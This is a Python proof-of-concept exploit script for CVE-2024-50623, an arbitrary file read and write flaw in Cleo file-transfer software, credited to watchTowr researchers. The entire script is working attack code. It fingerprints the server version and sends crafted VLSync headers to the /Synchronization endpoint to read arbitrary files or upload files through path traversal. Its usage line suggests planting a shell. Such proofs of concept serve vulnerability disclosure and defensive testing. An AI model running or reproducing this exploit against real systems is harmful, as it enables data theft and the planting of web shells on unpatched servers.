banner = """			 __         ___  ___________                   
	 __  _  ______ _/  |__ ____ |  |_\\__    ____\\____  _  ________ 
	 \\ \\/ \\/ \\__  \\    ___/ ___\\|  |  \\|    | /  _ \\ \\/ \\/ \\_  __ \\
	  \\     / / __ \\|  | \\  \\___|   Y  |    |(  <_> \\     / |  | \\/
	   \\/\\_/ (____  |__|  \\___  |___|__|__  | \\__  / \\/\\_/  |__|   
				  \\/          \\/     \\/                            
	  
        CVE-2024-50623.py
        (*) Cleo Unrestricted file upload and download vulnerability (CVE-2024-50623)

          - Sonny and Sina Kheirkhah (@SinSinology) of watchTowr (sina@watchTowr.com)

        CVEs: [CVE-2024-50623]  """


import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)
import requests
requests.packages.urllib3.disable_warnings()
import argparse

print(banner)

parser = argparse.ArgumentParser(usage="""python CVE-2024-50623 --target http://192.168.1.1/ --action read_or_write --where ..\\..\\pwned.txt --what shell.dll_jsp_xml_txt_zip""", description="Cleo Unrestricted file upload and download vulnerability (CVE-2024-50623)")

parser.add_argument("--target", help="Target URL", required=True)
parser.add_argument("--action", help="Action to perform", choices=['write', 'read'], required=True)
parser.add_argument("--where", help="File to write or read", required=True)
parser.add_argument("--what", help="local file to upload", required=False)

args = parser.parse_args()
args.target = args.target.rstrip('/')

s = requests.Session()
s.verify = False

def extract_version(target):
    r = s.get(f"{target}/Synchronization")
    version = r.headers['Server'].split('/')[1].split(' ')[0]
    return version

def read_file(target, where, target_version):
    headers = {
        'VLSync': f"Retrieve;l=Ab1234-RQ0258;n=VLTrader;v={target_version};a=1337;po=1337;s=True;b=False;pp=1337;path={where}"
    }
    

    r = s.get(f"{target}/Synchronization", headers=headers)
    if(r.status_code == 200):
        print(r.text)
    else:
        print("[ERROR] Failed to read the file")


def write_file(target, where, what, target_version):

    headers = {
        'VLSync': f"ADD;l=Ab1234-RQ0258;n=VLTrader;v={target_version};a=1337;po=1337;s=True;b=False;pp=1337;path={where}"
    }

    r = s.post(f"{target}/Synchronization", headers=headers, data=what)
    if(r.status_code == 200):
        print("[INFO] File written successfully")
    else:
        print("[ERROR] Failed to write the file")




if(args.action == 'read'):
    read_file(args.target, args.where, extract_version(args.target))
elif(args.action == 'write'):
    if(args.what == None):
        print("[ERROR] --what is required for write action")
        exit(1)
    write_file(args.target, args.where, open(args.what,"rb").read(), extract_version(args.target))
else:
    print("[ERROR] Invalid action")
    exit(1)


    